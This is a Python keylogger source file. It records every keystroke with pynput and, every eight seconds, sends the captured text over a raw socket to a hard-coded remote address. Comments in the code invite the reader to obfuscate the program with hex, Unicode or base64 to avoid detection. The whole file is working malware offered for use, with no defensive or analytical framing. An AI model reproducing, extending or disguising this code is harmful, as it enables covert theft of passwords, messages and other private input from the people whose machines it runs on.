import logging
import socket
import threading
from pynput.keyboard import Key, Listener

# You can try and obfuscate this code.
# Try using Hex / Unicode / base64 or some strange logic on the program's.
# Any Ideas?

buffer = ''
buffer_lock = threading.Lock()

def send_buffer():
    global buffer
    with buffer_lock:
        if buffer:
            # Check for buffer ( if it's not empty)
            message_to_send = buffer + "  <--|| "
            try:
                m = socket.socket()
                # Change IP/PORT (WhySoSerious?)
                m.connect(("10.0.2.40", 8080))
                m.send(message_to_send.encode())
                m.close()
            except Exception as e:
                logging.error(f"Exception: {e}")
            buffer = ''  # Clear the buffer after sending
        threading.Timer(8, send_buffer).start()  # Reset the timer to call send_buffer again in 4 seconds
        # Change the timer as you wish as i only tested it for 8 seconds DELAY.

def on_press(key):
    global buffer
    key_str = str(key).replace("'", "")
    if key_str.startswith("Key."):
        if key == Key.space:
            # Convert space key to a space character
            key_str = ' '
        else:
            # Ignore other special keys or handle them as needed
            key_str = ''

    with buffer_lock:  # Ensure thread-safe manipulation of the buffer
        buffer += key_str

send_buffer()
with Listener(on_press=on_press) as listener:
    listener.join()
